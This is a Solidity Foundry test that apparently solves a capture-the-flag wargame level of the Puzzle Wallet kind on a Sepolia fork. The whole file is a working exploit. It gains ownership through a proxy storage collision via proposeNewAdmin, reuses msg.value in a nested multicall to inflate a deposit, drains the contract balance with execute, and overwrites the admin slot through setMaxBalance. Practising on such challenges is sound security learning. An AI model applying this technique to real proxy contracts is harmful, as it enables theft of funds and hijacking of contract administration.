// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "forge-std/Test.sol";

contract ExploitLevel24 is Test {
    ILevel14 instance = ILevel14(0x3F9b87959f598D0A2a398330704fa54a3A9c1A30);
    address player = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;

    function setUp() external {
        vm.createSelectFork("sepolia");
    }

    function testExploit() external {
        instance.proposeNewAdmin(player);
        console.log("Owner:", instance.owner());
        console.log("Balance:", address(instance).balance);

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(instance.deposit.selector);
        bytes[] memory nestedMulticall = new bytes[](2);
        nestedMulticall[0] = abi.encodeWithSelector(instance.deposit.selector);
        nestedMulticall[1] = abi.encodeWithSelector(instance.multicall.selector, depositSelector);

        vm.startPrank(player);
        instance.addToWhitelist(player);
        instance.multicall{value: 0.001 ether}(nestedMulticall);
        instance.execute(player, 0.002 ether, "");
        instance.setMaxBalance(uint256(uint160((player))));
        vm.stopPrank();

        console.log("Admin:", instance.admin());
    }
}

interface ILevel14 {
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function multicall(bytes[] calldata) external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function setMaxBalance(uint256) external;
    function deposit() external payable;
    function owner() external returns (address);
    function admin() external returns (address);
}
